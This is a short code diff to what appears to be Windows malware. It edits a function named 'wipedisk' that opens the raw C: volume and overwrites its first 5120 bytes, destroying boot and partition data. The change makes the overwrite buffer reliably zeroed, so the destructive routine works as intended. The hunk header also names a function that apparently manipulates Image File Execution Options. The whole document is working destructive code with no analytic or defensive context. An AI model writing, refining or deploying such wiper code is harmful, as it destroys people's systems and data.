@@ -106,11 +106,11 @@ void SetImageFileExecution(LPCWSTR lpKeyWithProgramName)
 DWORD WINAPI wipedisk(_In_ LPVOID lpParam)
 {
 	DWORD wipeC;
-	LPCVOID zero = malloc(5120);
+	LPCVOID zero = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 5120);
 	HANDLE HDiskC = CreateFileW(L"\\\\.\\C:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
 	SetFilePointer(HDiskC, 0, NULL, FILE_BEGIN);
 	WriteFile(HDiskC, zero, 5120, &wipeC, NULL);
-	free(zero);
+	HeapFree(GetProcessHeap(), NULL, zero);
 	CloseHandle(HDiskC);
 
 	DWORD wipe0;
